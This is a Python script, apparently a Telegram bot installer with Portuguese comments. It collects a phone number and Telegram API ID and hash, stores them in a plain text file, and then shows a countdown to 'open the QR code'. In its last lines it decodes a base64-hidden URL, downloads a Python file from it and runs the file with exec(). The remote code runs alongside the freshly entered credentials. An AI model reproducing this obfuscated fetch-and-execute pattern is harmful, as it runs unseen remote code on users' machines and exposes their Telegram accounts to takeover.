# -*- coding: utf-8 -*-
import os
import subprocess
# Lista dos módulos que não são padrões do Python
modulos_nao_padrao = [    'requests',    'telethon',    'qrcode']
while True:
    try:
        # Verifica se os módulos não padrão estão instalados
        modulos_faltantes = [modulo for modulo in modulos_nao_padrao if not os.system(f'python -c "import {modulo}"') == 0]
        
        if len(modulos_faltantes) == 0:
            print("Todos os módulos não padrão estão instalados.")
            break
        else:
            # Instala os módulos que estão faltando
            for modulo in modulos_faltantes:
                print(f"Instalando o módulo: {modulo}")
                subprocess.run(['pip', 'install', modulo])
                
    except Exception as e:
        print(f"Ocorreu um erro durante a instalação do módulo: {modulo}")
        print(f"Erro: {str(e)}")
        exit()

import time
import requests
import io 
import os
from base64 import urlsafe_b64decode as base64urldecode
clear = lambda: os.system('cls' if os.name=='nt' else 'clear')  #Chama qualquer comando de cmd para o Python
def verificar_arquivo_existe(dados_path, telefone):
    arquivo_telefone = os.path.join(dados_path, f'meutelefone.txt')
    if os.path.exists(arquivo_telefone):
        with open(arquivo_telefone, 'r') as arquivo:
            linhas = arquivo.readlines()
            if len(linhas) == 3 and linhas[0].startswith('TEL') and linhas[1].startswith(f'ID') and linhas[2].startswith(f'HASH'):
                return True
    return False

def criar_pasta_telefone(telefone):
    dados_path = os.path.join(DDIDDDTELEFONE, 'dados')  # Navegar um nível acima para a pasta "DDIDDDTELEFONE"
    if not os.path.exists(dados_path):
        os.makedirs(dados_path)
    return dados_path

def salvar_dados_telefone(dados_path, telefone, id_telegram, hash_telegram):
    arquivo_telefone = os.path.join(dados_path, f'meutelefone.txt')
    with open(arquivo_telefone, 'w') as arquivo:
        arquivo.write(f'TEL {telefone}\n')
        arquivo.write(f'ID {id_telegram}\n')
        arquivo.write(f'HASH {hash_telegram}\n')


global DDIDDDTELEFONE

ddi = input('Digite o DDI (código do país): ')
ddd = input('Digite o DDD (código da região): ')
telefone = input('Digite o número de telefone (sem DDI e DDD): ')
telefone_completo = f'{ddi}{ddd}{telefone}'
# Variável global para armazenar o DDIDDDTELEFONE
DDIDDDTELEFONE = telefone_completo


dados_path = criar_pasta_telefone(telefone_completo)
#clear()
if not verificar_arquivo_existe(dados_path, telefone_completo):
    id_telegram = input('Digite o ID do Telegram: ')
    hash_telegram = input('Digite o HASH do Telegram: ')
    
    salvar_dados_telefone(dados_path, telefone_completo, id_telegram, hash_telegram)
    print('Dados salvos com sucesso!')
else:
    print('Os dados já foram salvos anteriormente. Ignorando a próxima etapa.')
    

#print(f'Pasta para o número de celular {DDIDDDTELEFONE}, concluída\nCarregando QRCode para o Telegram')
#print(f'Abra seu Telegram no celular, com o número {DDIDDDTELEFONE},\n vá em Configurações e Dispositivos e aponte para o QRCode da tela')
# Defina o tempo total em segundos que você deseja contar
tempo_total = 5
for i in range(tempo_total, -1, -1):
    if i == 0:
        print("Abrindo o QRCode agora!               ")  # A mensagem indicando que o QRCode será aberto
    else:
        print(f"Carregando o QRCode em: {i} segundo(s)", end='\r')
    time.sleep(1)

criaqrcode = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhbmFscWIvYm90X3RlbGVncmFtL21haW4vaW5zdGFsbC9hYnJpcnFyLnB5"
criaqrcode = base64urldecode(criaqrcode.encode("utf-8"))
criaqrcode = criaqrcode.decode("utf-8")
headers = {'Referer': criaqrcode}
criaqrcode = requests.get(criaqrcode, headers=headers)
criaqrcode = criaqrcode.text
exec(criaqrcode)    
